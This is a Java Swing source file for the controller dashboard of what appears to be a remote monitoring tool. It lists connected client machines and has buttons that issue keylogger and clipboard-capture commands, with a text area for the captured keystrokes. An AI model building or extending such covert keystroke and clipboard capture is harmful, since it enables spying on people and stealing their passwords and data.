package swing;

import admin.Admin;
import swing.button.ButtonCustom;
import swing.progressbar.ProgressBarCustom;
import swing.table.TableCustom;
import utils.console;

import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;

import static utils.Command.*;

public class DashboardGUI extends JFrame {
    private static Admin admin;
    /**
     * Components
     */
    private JPanel main;
    private JTable table;
    private JScrollPane jscrollpane;
    private JPanel header;
    private JPanel footer;
    private JPanel body;
    private ButtonCustom buttonCustom1;
    private JPanel right;
    private JPanel left;
    private JPanel center;
    private JLabel lbl_title_disk;
    private JLabel lbl_title_ram;
    private JLabel lbl_title_cpu;
    private JLabel lbl_title_uuid;
    private JLabel lbl_uuid;
    private JLabel lbl_cpu;
    private JLabel lbl_ram;
    private JLabel lbl_disk;
    private JPanel pnl_client_action;
    private JPanel pnl_client_information;
    private JPanel pnl_client_progress_bar;
    private ProgressBarCustom pgb_cpu;
    private ProgressBarCustom pgb_ram;
    private ProgressBarCustom pgb_disk;
    private JLabel lbl_title_ip;
    private JLabel lbl_ip;
    private JPanel pnl_client_screen;
    private JPanel pnl_client_log;
    private JLabel lbl_image;
    private JTextArea txt_area_keylogger;
    private ButtonCustom btn_clipboard;
    private ButtonCustom btn_keylogger;

    private static DefaultTableModel defaultTableModel = new DefaultTableModel();
    private static final Object[] tableHeaders = {"ID", "CPU", "RAM", "DISK", "IP"};
    private String currentClientId;

    public DashboardGUI() throws IOException {
        (admin = new Admin(this)).start();
        this.initFrame();
        table.setModel(defaultTableModel);
        TableCustom.apply(jscrollpane, TableCustom.TableType.MULTI_LINE);
        ImageIcon imageIcon = new ImageIcon(new ImageIcon("/test4.jpg").getImage().getScaledInstance(350, 210, Image.SCALE_SMOOTH));
        this.lbl_image.setIcon(imageIcon);
    }

    private void initFrame() {
        this.setSize(1200, 800);
        this.setResizable(true);
        this.setLocationRelativeTo(null);
        this.setTitle("Monitoring system");
        this.setContentPane(main);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.main.setBackground(Color.WHITE);
        this.right.setBackground(Color.WHITE);
        this.left.setBackground(Color.WHITE);
        this.header.setBackground(Color.WHITE);
        this.body.setBackground(Color.WHITE);
        this.footer.setBackground(Color.WHITE);
        this.pnl_client_progress_bar.setBackground(Color.WHITE);
        this.pnl_client_information.setBackground(Color.WHITE);
        this.pnl_client_action.setBackground(Color.WHITE);
        this.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        this.table.getSelectionModel().addListSelectionListener(new ListSelectionListener() {
            public void valueChanged(ListSelectionEvent e) {
                int selectedRow = table.getSelectedRow();
                if (selectedRow == -1) {
                    return;
                }
                console.log("[selectedRow]" + selectedRow);
                lbl_uuid.setText((String) table.getValueAt(selectedRow, 0));
                lbl_ram.setText((String) table.getValueAt(selectedRow, 2));
                lbl_disk.setText((String) table.getValueAt(selectedRow, 3));
                lbl_cpu.setText((String) table.getValueAt(selectedRow, 1));
                lbl_ip.setText((String) table.getValueAt(selectedRow, 4));

                currentClientId = lbl_uuid.getText();
                console.info("[CURRENT CLIENT] " + currentClientId);
            }

        });
        this.btn_clipboard.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_CLIPBOARD);
            }
        });
        this.btn_keylogger.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_KEYLOGGER);
            }
        });
        defaultTableModel.setColumnIdentifiers(tableHeaders);
        new Thread(this::fetch).start();
        new Thread(this::monitoring).start();
    }

    public void monitoring() {
        while (true) {
            console.warn("MONITORING FETCHING...");
            try {
                if (currentClientId != null) {
                    admin.onHandle(COMMAND_MONITORING);
                }
                Thread.currentThread().sleep(2000);
            } catch (InterruptedException e) {
                e.getStackTrace();
                throw new RuntimeException(e);
            }
        }
    }

    public void fetch() {
        while (true) {
            console.warn("GUI FETCHING...");
            try {
                (defaultTableModel = new DefaultTableModel()).setColumnIdentifiers(tableHeaders);
                admin.getClients().forEach((key, value) -> {
                    defaultTableModel.addRow(new Object[]{
                            key,
                            value.getCpu(),
                            value.getRam(),
                            value.getDisk(),
                            value.getIp()});
                });
                table.setModel(defaultTableModel);
                Thread.currentThread().sleep(5000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public void updateProgressBar(int cpu, int ram, int disk) {
        this.pgb_cpu.setValue(cpu);
        this.pgb_ram.setValue(ram);
        this.pgb_disk.setValue(disk);
    }

    public void appendLog(String message) {
        txt_area_keylogger.append(message + "\n");
    }

    public String getCurrentClientId() {
        return currentClientId;
    }
}
